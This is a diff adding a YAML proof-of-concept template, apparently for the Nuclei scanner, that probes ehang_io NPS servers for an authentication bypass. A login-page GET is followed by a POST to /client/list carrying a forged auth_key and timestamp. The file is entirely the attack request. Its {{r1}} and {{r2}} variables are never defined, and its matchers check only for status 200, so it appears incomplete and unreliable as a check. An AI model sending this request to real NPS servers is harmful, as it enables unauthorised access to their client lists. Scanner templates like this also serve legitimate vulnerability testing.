@@ -1,0 +1,28 @@
+id: yaml-poc-ehang_io-nps-logical-CT-469727
+info:
+  name: Yaml Poc Ehang_Io Nps Logical Ct 469727
+  author: converted
+  severity: high
+  description: 'Converted from xpoc: yaml-poc-ehang_io-nps-logical-CT-469727'
+  tags: xpoc
+  reference: []
+http:
+- method: GET
+  path:
+  - /login/index
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+- method: POST
+  path:
+  - /client/list
+  body: search=&order=asc&offset=0&limit=10&auth_key={{r2}}&timestamp={{r1}}
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
